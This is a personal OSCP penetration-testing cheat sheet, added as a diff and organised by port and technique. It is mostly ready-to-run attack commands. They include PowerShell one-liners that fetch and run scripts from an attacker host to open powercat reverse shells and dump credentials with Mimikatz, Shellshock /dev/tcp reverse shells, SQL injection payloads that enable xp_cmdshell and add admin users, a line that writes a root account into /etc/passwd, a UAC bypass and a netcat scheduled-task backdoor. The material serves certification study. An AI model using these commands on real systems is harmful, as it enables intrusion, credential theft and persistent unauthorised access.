@@ -1,0 +1,521 @@
+- oscp in general
+	- https://github.com/xMilkPowderx/OSCP
+------------------------------------------------
+
+# initial
+	- nmap
+	- netdiscover
+	- arpscan
+	- nbtscan
+	- nmapAutomator
+	- AutoRecon
+
+# 21
+	- anonymous
+	- read / write
+	- cve
+
+# 22
+	- cve:
+		- debian ssh keys w/ openssl vuln have limited ssh key pairs and enumerable.
+			- Grab backup of authorized_keys and search for pub key (https://github.com/g0tmi1k/debian-ssh), using corresponding private and ssh as user.
+
+# 53
+	- dig  @<ip_address> <domain>
+	- dig axfr @<ip_address> <domain>
+
+# 69
+	- "blind" requests.
+	- Example: get \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf 
+
+# 79
+	- finger @<ip_addr>
+	- finger <user>@<ip_addr>
+	- nmap finger script
+	- finger-user-enum.pl
+
+# 88
+	- If domain is known, enumerate users (UPN):
+		- nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm=thinc.local,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.11.1.220
+	- Password spraying:
+		- ./kinit_horizontal_brute.sh xor.com 10.11.1.120 ./krb_users.txt /usr/share/wordlists/rockyou.txt
+	- Kerberoasting:
+		- Impacket
+			- GetUserSPNs.py
+		- PowerSploit
+			- powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.151/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue | Select-Object Hash| Out-File -filepath \\192.168.119.151\meh\kerb-john.txt -Width 8000"
+
+
+# 139
+- rpcinfo
+- rpcgrind
+
+# 161/162
+	- snmp-check
+		- Example 1:
+			- snmp-check -v2c -c public <ip_addr>
+
+
+# 389/636/3268/3269/9389
+	- ldapsearch
+		- ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb
+	- ldapdomaindump
+		- ldapdomaindump -u <domain>\<user> <host_or_ip_addr>
+
+
+# 445
+- smbmap
+	- "-p" can be password or NTLM hash.
+	- smbmap -H <ip_addr>
+	- smbmap -H <ip_addr> -u <username> -p <password>
+- enum4linux
+- Get version info by looking at tcpdump/wireshark for smb/smb-over-netbios requests.
+- rpcclient
+	- https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/c
+	- rpcclient -U "" -N <ip_addr>
+	- enumdomusers
+	- enumdomgroups
+	- querygroup 0x200 (domain admins)
+	- querygroupmem 0x200 
+	- query user
+- cve:
+	 - exploitdb 10.c and compile, scan network, run "./samba_2.2.x -b 0 -v 10.11.1.115"
+	 - EternalBlue (smbv1)
+	 	- Example 1:
+	 		- python ~/tools/AutoBlue-MS17-010# python2.7 zzz_exploit.py 10.11.1.75
+	 	- Example 2:
+	 	- python ~/tools/MS17-010 send_and_execute.py 10.10.10.4 rshell.exe
+	 - rootfs symlink traversal file.
+	 - samba version 4.5.x (linux/ubuntu)
+	 	- sambacry (had to use metasploit)
+	 - samba 3.0.20 for "Samba usermap script"
+	 	- https://github.com/amriunix/CVE-2007-2447
+- crackmapexec / cme:
+	- Lateral movement (pth/ptt)
+	- Remote local admin auth / rce.
+	- Example 1: 
+		- Windows:
+			- crackmapexec smb 10.11.1.24 --local-auth -u administrator -H ee0c207898a5bccc01f38115019ca2fb -X "iex((New-Object System.Net.Webclient).DownloadString('http://192.168.119.151/powercat.ps1'));powercat -c 192.168.119.151 -p 443 -e cmd"
+	- Example 2: 
+		- crackmapexec <host> -u <username> -H <NTLM hash> --shares
+- smbclient
+		- smbclient -N -L //<ip_or_hostname>
+		- smbclient -U <username>%<NTLM hash> --pw-nt-hash -L //<hostname>/
+		- smbclient -U <username>%<NTLM hash> --pw-nt-hash -L //<hostname>/<share>
+
+- mount -t cifs -o user=anonymous //<host_or_ip_addr>/sharedir/sharename /mnt/<name>
+	- mount vhd using qemu-nbd
+		- qemu-nbd -r -c /dev/nbd0 "/mnt/<mount_path>/<filename>.vhd"
+		- mount -r /dev/nbd0p1 /mnt/vhd
+
+- impacket
+	- GetNPUsers.py
+		- list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication'
+		- Doesn't require auth.
+		- GetNPUsers.py -no-pass -dc-ip <ip_addr> <domain>/<username_to_check>
+			- Example 1:
+				- for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+
+	- GetUserSPNs.py
+		- Requires auth.
+
+	- secretsdump.py
+		- Example 1:
+			- secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+
+	- wmiexec.py
+		- Example 1:
+			- wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<nt_hash> <domain_name>/<username>@<ip_addr>
+
+# 80/443
+- If hostname is known, add to /etc/hosts and try using hostname.
+- nikto
+- HTTP options
+	- curl -i -X OPTIONS http://example.org/path
+- gobuster
+	- directory wordlist
+		- try enum on discovered dirs
+	- files wordlist
+	- specific extensions
+		- cgi
+			- sh
+			- pl
+			- cgi
+		- php
+		- html
+		- bak
+		- asp, aspx
+		- txt
+- wfuzz
+- wpscan
+	- Enumerate:
+		- Users
+		- Plugins
+	- Brute force enumerated users
+	- Shell:
+		- Install plugin
+		- Edit plugin or theme (i.e. twentytwelve rev shell added to 404.php)
+- droopescan
+- LFI / RFI
+	- php wrappers
+		- curl http://<URL/URI>?<vuln_param>=php://input%00" --data "<?php system('ls'); ?>"
+	- Log file injection
+	- Google "turning lfi into shell"
+
+- After shell, look within web root directory for secrets.
+	- web.config
+- Tomcat:
+	- default creds
+		- tomcat / s3cret @ /manager 
+	- upload WAR reverse/cmd shell.
+- WebDav
+	- davtest
+	- cadaver
+	- https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
+		- Worked as netcat/raw. 
+	- https://github.com/danigargu/explodingcan
+		- Only worked with meterpreter.
+- ASP/ASPX
+	- If can upload, web.config can execute ASP code.
+- Hydra
+	- Example 1 (http-post-form):
+		- hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip_addr> http-post-form “/:password=^PASS^:Invalid password!” -s <port>
+
+
+# 500
+	- ike service
+	- nmap -sU -p500 --script ike-version <ip_addr>
+	- ike-scan <ip_addr> -M
+	- config /etc/ipsec.conf to connect
+		- ipsec start
+		- ipsec up <hostname/ip_addr>
+
+# 1433
+	- orcaMDF framework and invoke-mdhashes.ps1 to extract hashes from mdf file.
+		- Reference:
+			- https://blog.xpnsec.com/extracting-master-mdf-hashes/
+			- https://xpnsec.tumblr.com/post/145350063196/extracting-sql-server-hashes-from-mastermdf
+	- sqsh
+		- Example: sqsh  -S mssql -D master -U sa -P sqls3rv3r
+	- Enable xp_cmdshell and execute:
+		- Example 1:
+			- EXEC sp_configure 'show advanced options',1;
+			- RECONFIGURE;
+			- EXEC sp_configure 'xp_cmdshell',1;
+			- RECONFIGURE;
+		- Example 2:
+			- EXEC xp_cmdshell 'net user hax haxhaxhax /add';EXEC xp_cmdshell 'net localgroup administrators hax /add'
+
+# 1521
+	- odat
+		- https://hackingprofessional.github.io/Security/how-to-hack-an-Oracle-database-server/
+	- metasploit
+	- Process:
+		- https://0xdf.gitlab.io/2018/08/04/htb-silo.html
+		- Identify database
+		- SID enumeration
+		- Credential brute force
+	- sqlplus to connect
+
+# 3306
+	- raptor_udf2
+		- https://github.com/ankh2054/MySQL-UDF/blob/master/raptor_udf2.c
+		- https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
+		- then final payload for priv esc:
+		- select do_system('cp /bin/bash /tmp/broot; chown root:j0hn /tmp/broot; chmod +s /tmp/broot');
+
+# 5985/5986
+	- WinRM 
+	- evil-winrm
+		- https://github.com/Hackplayers/evil-winrm.git
+		- Example 1:
+			- ruby /opt/evil-winrm/evil-winrm.rb -i <ip_addr> -u <username> -p <pass>
+
+# Squid Proxy
+	- Try hitting localhost:<port> using proxy.
+
+--------------------------------------------
+# Cross compiling (On linux for Windows)
+	- gcc -m32 -Wl,--hash-style=both  -o exploit 9542.c
+	- i686-w64-mingw32-gcc 37755.c -o exploit -lws2_32
+# restricted / limited shell
+- python
+	- python -c 'import pty;pty.spawn("/bin/bash")'
+- PATH variable
+	- export PATH=$PATH:/bin/usr/bin
+	- export SHELL=/bin/bash
+
+# docker priv esc
+	- docker run -v /:/mtn/host -ti ubuntu
+
+# Windows MSSQL
+	- 8.3 notation is useful when paths contain spaces and can't be quoted.
+		- Example: \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
+
+
+# Windows shell / access`
+	- nc.exe
+		- If using a windows service w/ netcat, invoke netcat twice to ensure shell doesn't get killed by windows after 30 seconds.
+	- powershell -c "iex((New-Object System.Net.Webclient).DownloadString('http://192.168.119.151/powercat.ps1'));powercat -c 192.168.119.151 -p 443 -e cmd"
+	- RDP
+		- reg query  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /s
+		- reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	- /usr/share/webshells/aspx/cmdasp.aspx
+	- aspex reverse shell
+		- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=8080 -f aspx -o shell.aspx
+	- Impacket
+		- /usr/share/doc/python-impacket/examples/psexec.py hax:haxhaxhax@10.11.1.73 cmd -path C:\\windows\\system32\\
+
+	- Custom command:
+		- Example 1:
+
+			```
+			#include <stdlib.h>
+			int main ()
+			{
+			int i;
+			    i = system("net localgroup administrators theusername /add");
+			return 0;
+			}
+			```
+			- i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+
+# Windows dump credentials / passwords
+	- sam/system
+		- C:\Windows\System32\config\SYSTEM
+		- C:\Windows\System32\config\SAM
+	- reg commands
+		- Example 1:
+			- reg save hklm\sam sam
+			- reg save hklm\system system
+			- samdump2 system sam
+		- Example 2 (autologon):
+			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+		- Example 3 (password in registry):
+			- reg query HKLM /f password /t REG_SZ /s
+			- reg query HKCU /f password /t REG_SZ /s
+	- Mimikatz sekurlsa
+		- powershell -c "iex((New-Object System.Net.Webclient).DownloadString('http://192.168.119.151/im.ps1'));Invoke-Mimikatz -command privilege::debug; Invoke-Mimikatz -dumpcreds"
+		- Example 2 when logged-in w/ mimikatz binary:
+			- privilege::debug
+			- token::elevate
+			- lsadump::sam
+	- Mimikatz minidump
+		- powershell -c "iex((New-Object System.Net.Webclient).DownloadString('http://192.168.119.151/Out-Minidump.ps1')); get-process lsass | Out-Minidump"
+		- pypykatz to extract hashes from memory dump.
+
+# Windows recon / priv esc / exploits
+	- Recon/Enum
+		- systeminfo
+		- wmic qfe get Caption,Description,HotFixID,InstalledOn
+		- dir /s
+			- dir /s *pass* == *cred* == *vnc* == *.config*
+		- dir /x
+		- schtasks /query /fo LIST /v
+		- icacls / cacls
+		- sc query state= all
+		- Unquoted Service Paths:
+			- wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+			- sc query
+			- sc qc service_name
+		- AlwaysInstallElevated:
+			- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+			- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+
+	- Utils:
+		- lolbins
+		- https://gist.githubusercontent.com/sckalath/ec7af6a1786e3de6c309/raw/206505282d0d0261cbc2bce8c33d55fe6ac6b7fd/wget_vbs
+		- certutil -urlcache -split -f http://<ipaddress>:<port>/<file>
+		- Powershell:
+			- powershell -exec bypass -c "Invoke-WebRequest -Uri http://10.10.15.150/<file> -OutFile C:\Users\admin\desktop\<file>"
+		- RunAs:
+			- run-as-attached-networked binary
+			- https://github.com/xiaoxiaoleo/pentest-script/blob/master/RunAs/runas.ps1
+			- https://ired.team/offensive-security-experiments/offensive-security-cheetsheets
+	
+	- Priv Esc:
+		- fuzzysecurity.com/tutorials/16.html
+		- PowerSploit, PowerUp
+		- powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.151/PowerUp.ps1');Invoke-AllChecks"
+		- JuicyPotato
+		- Example:
+			- jp.exe -l 1337 -p rev.bat -t * -c  {659cdea7-489e-11d9-a9cd-000d56965251}
+		- Windows XP:
+			- upnphost service:
+				- change upnphost service to execute reverse shell and start service.
+				- ensure ssdpsrv service (dependency) is also start if not already.
+				- Example:
+					- sc config upnphost binpath= "cmd.exe /c start C:\Inetpub\nc.exe -nv 192.168.119.151 8999 -e C:\WINDOWS\System32\cmd.exe" start= auto error= ignore
+					- sc config upnphost obj= ".\LocalSystem" password= ""
+		- windows-privesc-check2
+			- windows-privesc-check2.exe --audit -a -o report
+		- seatbelt
+		- winpeas
+		- Powershell Transcript logging
+			- PSTranscripts
+		- accesschk.exe
+			- .\accesschk -accepteula -uvwc *
+		- jaws
+			- Example 1 (Within CMD):
+				- powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+			- Example 2 (Within Powershell):
+				- .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
+		- cmdkey /list
+		- runas.ps1
+
+	- UAC Bypass:
+		- cmstp uac bypass
+			- powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.151/bypassuac-smstp.ps1');BypassUAC-CMSTP -comando 'C:\users\alice\meh\nc.exe 192.168.119.151 8443 -e cmd.exe'"
+bypassuac-smstp.ps1
+	
+
+	- Windows exploits
+		- https://github.com/SecWiki/windows-kernel-exploits
+		- If local listening service and exploit is written in a lang (i.e. python) not supported on the local system, try compiling the script into a binary and transferring. Or copying over a python interpreter.
+		- Example 1:
+			- .\p.exe 31853.py -t 127.0.0.1 -c "net user hax haxhaxhax /add"
+		- py2exe
+		- MS11-046 (afd.sys)
+			- Works within remote shell.
+		- MS16-098 (RGNOBJ)
+			- 41020.exe work within remote shell.
+		- MS10-059 (aka chimichurri)
+			- Can be used as regular kernel exploit or from "network service" user.
+		- ms08-067 (smb)
+		- EternalBlue (smb)
+
+	- Active Directory enum:
+		- GPP
+			- Decrypt on kali
+				- gpp-decrypt encryptedpassword
+		- # github.com/samratashok/admodule
+iex (new-Object Net.WebClient).DownloadString('http://192.168.119.151/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+		- powershell -c "iex (new-Object Net.WebClient).DownloadString('http://192.168.119.151/Import-ActiveDirectory.ps1');Import-ActiveDirectory;get-adgroupmember 'domain admins'"
+		- powershell -c "iex (new-Object Net.WebClient).DownloadString('http://192.168.119.151/Import-ActiveDirectory.ps1');Import-ActiveDirectory;get-adgroupmember 'Mail_Reader' | select samaccountname"
+		- powershell -c "iex (new-Object Net.WebClient).DownloadString('http://192.168.119.151/Import-ActiveDirectory.ps1');Import-ActiveDirectory;get-aduser sqlserver -properties * | select -expandproperty propertynames"
+		- dsquery group -samid secret_group | dsget group -members
+get-adgroupmember secret_group -recurse
+		- ShareSploit > Bloodhound.
+		- aclpwn
+			- Example 1:
+				- aclpwn -f <username> -t <domain_name> --domain <domain_name> --server <ip_addr>
+
+	- Alternative Data Streams (ADS)
+		- powershell -c "gc -path .\hm.txt -stream root.txt"
+	
+	- Methodologies:
+		- https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
+			- windows priv esc Fchecklist
+		- github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology+and+Resources
+		- https://github.com/xMilkPowderx/OSCP/blob/master/Windows%20Priv%20Esc.md
+		- https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842
+		- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+# Password cracking
+	- Try both hashcat and john
+		- Hashcat had bug that didn't enable cracking.
+	- Crackstation
+	- Google
+
+# SQL Injection
+	- Simple Payloads:
+		- admin' OR 1=1--
+		- %27+order+by+2--
+		- test' union select name,null from master..syslogins--
+		- test' union select null,null--
+		- test' union select (select banner from v$version where rownum=1),null,null from dual--;
+		- test' union select null,(select admin_id || '-' || admin_name || '-' || password from web_admins ),null from dual--;
+	- Second order sqli
+	- Wordlist
+	- MSSQL
+		- test' union select null,null;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
+=test'+union+select+null,null%3bEXEC+sp_configure+'show+advanced+options',1%3bRECONFIGURE%3bEXEC+sp_configure+'xp_cmdshell',1%3bRECONFIGURE%3b-
+		- test' union select null,null;EXEC xp_cmdshell 'net user hax haxhaxhax /add';EXEC xp_cmdshell 'net localgroup administrators hax /add'--
+
+# Linux priv esc
+	- Sudo 
+	- SUID/SGID
+	- Cron
+	- Local home dirs
+	- PATH variable in suid binaries.
+		- ELF suid and references relative path. Use ENV path to source referenced binary in script/command.
+		- Has to be a binary, can't be a script.
+	- pspy
+	- LinEnum
+	- linuxprivesc
+	- setuid / setgid
+		- PATH things
+		- gtfobins
+	- Writable passwd
+		- openssl passwd -1 -salt meh
+		- mkpasswd -m md5 pass
+			- echo "root2:\$1\$AWsHgNFv\$0jY4nsCS7vCUgX/MraVuG/:0:0:root2:/dev/shm/root2:/bin/bash" >> /etc/passwd
+
+# Linux (kernel) exploits
+	- 45010
+		- Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)
+		- Compile using "-m64" switch.
+	- Shellshock
+		- postfix
+		- ssh
+		- http
+			- Example 1:
+				- curl http://10.11.1.71/cgi-bin/admin.cgi -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.119.1 0>&1"''
+			- Example 2:
+				- wget -qO- -U "() { :;}; echo Content-Type: text/html; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.17/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
+
+	- DirtyCow (40839)
+		- Compile on target if possible.
+	- If local listening service and exploit is written in a lang (i.e. python) not supported on the local system, try compiling the script into a binary and transferring. Or copying over a python interpreter.
+		- pyinstaller
+	- mempodipper
+
+# Pivoting
+	- SSH tunnelling
+	- putty plink.exe
+		- plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
+
+
+# Hashcat
+	- krb5asrep / 18200
+		- hashcat -m 18200 <user>.kerb /usr/share/wordlists/rockyou.txt --force
+	- unshadow /etc/passwd /etc/shadow > unshadow.hashes
+
+
+--------------------------------------------------
+
+BufferOverflow
+https://github.com/mrinalpande/scripts/blob/master/python/badchars
+	- Common badcars:
+		- 0x00
+		- 0x0a
+
+- Create crash
+- Repeat crash
+- Use pattern and find offset
+	- might need to trim/add more bytes
+- Confirm control of EIP
+- Check if space after ESP can be used for shellcode.
+	- If not, how much space is allowed?
+- Find bad characters
+- Generate shellcode
+	- Might need to do a couple times.
+	- Use '-b' for badchars
+	- Use '-e' for encoding
+		- -e x86/shikata_ga_nai 
+	- Might also use exitfunc=thread or exitfunc=process
+		- exitfunc=thread
+- Use nasm_shell to lookup opcode for any jumps
+	- Example:
+		- JMP ESP
+		- JMP EAX
+- Lookup if pointers exist.
+	- !mona modules
+	- !mona -s '\xff\xe4' -m 'VulnBinary.exe'
+	- Reverse returned memory address (Little Endian) in code.
+- Add some nops and/or offset, adjust as needed.
+- ...
+- Add persistence:
+	- Example:
+		- schtasks /create /sc minute /mo 1 /tn "bd" /tr "C:\Users\User123\AppData\Local\Temp\nc.exe 10.10.11.131 443 -e cmd.exe"
